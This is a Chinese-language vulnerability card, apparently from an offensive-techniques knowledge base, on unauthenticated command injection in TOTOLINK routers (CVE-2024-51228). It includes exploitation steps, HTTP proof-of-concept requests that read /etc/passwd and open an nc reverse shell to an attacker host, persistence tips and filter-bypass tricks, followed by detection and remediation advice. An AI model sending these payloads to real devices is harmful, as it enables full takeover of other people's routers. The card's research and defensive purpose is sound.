---
id: iot-totolink-boafrm-formsyscmd-syscmd-command-injection
title: TOTOLINK /boafrm/formSysCmd 的 sysCmd GET 参数经 sprintf 拼进 system() 造成未授权命令注入（CVE-2024-51228）
type: scenario
domain: iot
path: iot
technique: totolink-boafrm-formsyscmd-syscmd-system-injection
aliases:
- CVE-2024-51228
- TOTOLINK formSysCmd
- boafrm formSysCmd 命令注入
- sysCmd 参数命令执行
- TOTOLINK 未授权 RCE
tags:
- iot
- router
- totolink
- command-injection
- system
- boafrm
- unauth
- mips
cve:
- CVE-2024-51228
severity: critical
confidence: low
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:25:42+08:00'
  notes: 已对照原文核对；本次核对未读取图片；/boafrm/formSysCmd、formSysCmd 取 GET 参数 sysCmd 后 sprintf 拼模板再交 system 执行、CVE-2024-51228 均为正文明确给出；未验证点：受影响型号与版本区间、实际 PoC 请求与回显都在未读取的通告截图中，卡内 confidence 已降为 low 且 PoC 段已注明需按固件反汇编确认；未授权结论依据原文表述
---

## 一句话结论

TOTOLINK 路由器 Web 管理面 `/boafrm/formSysCmd` 表单处理函数 `formSysCmd` 把 GET 参数 `sysCmd` 取出后拼进一条命令模板（`sprintf` 到局部缓冲区），再交给 `system()` 执行，中间没有任何字符过滤、没有命令白名单，也没有做管理员会话校验；因此未授权的远程攻击者只要构造 `GET /boafrm/formSysCmd?sysCmd=<命令>` 就能以 httpd 进程权限执行任意命令（CVE-2024-51228）。

## 原理

- 路由器 Web 管理面用 Boa 风格的 `*/boafrm/*` 表单端点：每个端点对应一个 `formXxx` 处理函数，参数从 `QUERY_STRING`/POST body 里按名字取。
- `formSysCmd` 里先用 `websGetVar(wp, "sysCmd", "")` 之类的封装取出 `sysCmd`（伪代码中的 `v3`），再用 `sprintf(v6, "....%s....", v3)`（伪代码第 15 行）把它拼进命令模板，最后 `system(v6)`（伪代码里 `v6` 作为 system 的参数）。
- 命令注入之所以成立，是因为**拼接在 shell 解析之前完成**：`system()` 会调用 `/bin/sh -c`，参数里的 `;`、`|`、`&&`、`$()`、反引号都由 shell 解释，而 `sysCmd` 的值直接进入了这条被解释的字符串，没有经过 `escapeshellarg` 一类转义。
- 未授权是因为该端点没有走 `Form_Login` 的会话校验分支（TOTOLINK 的多数 `boafrm` 端点在 httpd 里统一判断 `SESSION_ID`，但 `formSysCmd` 属于诊断/工具类端点，按原文通告属于可直接访问），所以攻击者不需要登录即可触达 sink。
- 危害等级取决于 httpd 运行身份：嵌入式设备上 httpd 常以 root 运行，此时命令注入直接等同设备完全控制；即使降权为 `nobody`，也能读配置、改 `/etc`、植入持久化。

## 触发条件

- 设备为受影响 TOTOLINK 型号/固件（CVE-2024-51228 对应的版本区间以厂商通告为准；原文未给出具体型号与版本号，故本卡不标注 affected_versions）。
- Web 管理面可从攻击者位置访问（LAN 侧或已映射到 WAN）。
- `/boafrm/formSysCmd` 端点存在且未做会话校验（原文实测可直接触发）。
- `sysCmd` 参数未做 shell 元字符过滤。

## 利用步骤

1. 确认端点存在：访问 `/boafrm/formSysCmd`，观察是否返回正常页面/无 404、无登录跳转。
2. 用无副作用命令验证注入：`?sysCmd=id`，再看回显或时间差；无回显时用 `?sysCmd=sleep%205` 做时间判定。
3. 换 `;`/`|` 拼接真实命令；URL 编码特殊字符（`;`→`%3B`、空格→`%20` 或 `+`、`&`→`%26`）。
4. 需要稳定交互时反弹 shell：`?sysCmd=nc%20<attacker>%204444%20-e%20/bin/sh`（设备无 nc 时用 `telnet`/`/dev/tcp`，busybox 环境也可 `wget` 拉脚本）。
5. 收集证据：`cat /etc/passwd`、`nvram show`（部分型号口令存 NVRAM）、`cat /etc_ro/*.conf`，确认权限与型号。
6. 需要持久化时改启动脚本或写入 `/etc/init.d`（注意先确认 rootfs 是否可写，多数为只读 squashfs，需用 overlay/`/tmp` 方案）。

## PoC

最小验证（无回显时可改用时间盲判）：

```http
GET /boafrm/formSysCmd?sysCmd=id HTTP/1.1
Host: <target>
```

命令拼接：

```http
GET /boafrm/formSysCmd?sysCmd=;cat%20/etc/passwd HTTP/1.1
Host: <target>
```

时间盲判（5 秒延迟说明命令被执行）：

```http
GET /boafrm/formSysCmd?sysCmd=;sleep%205 HTTP/1.1
Host: <target>
```

反弹 shell：

```http
GET /boafrm/formSysCmd?sysCmd=nc%20<attacker-ip>%204444%20-e%20/bin/sh HTTP/1.1
Host: <target>
```

说明：以上仅为请求形态，未对任何设备执行；原文正文只保留了伪代码层面的 `sprintf`→`system` 证据（关键截图未读取），实际参数名/拼接模板需按固件反汇编确认。

## 变体与关联

- 同一厂商同类端点：`/boafrm/formSysCmd` 之外的诊断类表单（ping、traceroute、时间同步、备份/恢复）常把参数直接拼进 `system`/`popen`，`ping` 类端点尤其常见（目标地址直接拼 `ping -c 4 <ip>`）。
- 过滤绕过：只拦 `;` 时用 `|`、`&&`、`\n`（`%0a`）、`$IFS` 代替空格、`${IFS}`、命令替换 `$(...)`/反引号；只拦小写关键字时用路径 `/bin/cat`、变量拼接。
- 与登录绕过组合：若目标固件给该端点加了会话校验，可先打同厂商的 `formLoginAuth.htm` 类认证绕过拿到 `SESSION_ID`（见 [[iot-totolink-nr1800x-formloginauth-authcode-login-bypass]]）再调用。
- 关联：[[iot-dlink-dir820l-ping-ccp-ping-addr-command-injection]]（同类 ping 参数注入）、[[iot-tplink-wr740-httpdebug-backdoor-pty-cmd]]（同类未授权调试端点）。

## 检测与防御

- 检测：HTTP 请求中出现 `/boafrm/formSysCmd` 且 `sysCmd` 含 `;`、`|`、`&&`、`$(`、反引号、`sleep`、`nc`、`wget`、`/bin/sh`；设备上出现 httpd 派生的 `sh -c` 子进程与异常外连。
- 修复：`sysCmd` 只接受白名单内的动作/参数（如固定几个诊断命令 + 严格校验的 IP/域名），或改用 `execve` 传参数数组、彻底不经过 shell；同时对 `/boafrm/*` 端点统一强制会话校验。
- 加固：关闭 WAN 侧管理面、限制管理 IP、httpd 降权运行、rootfs 只读 + 完整性校验。
- 出网侧：监控设备向非常规端口的外连（反弹 shell 的典型特征）。
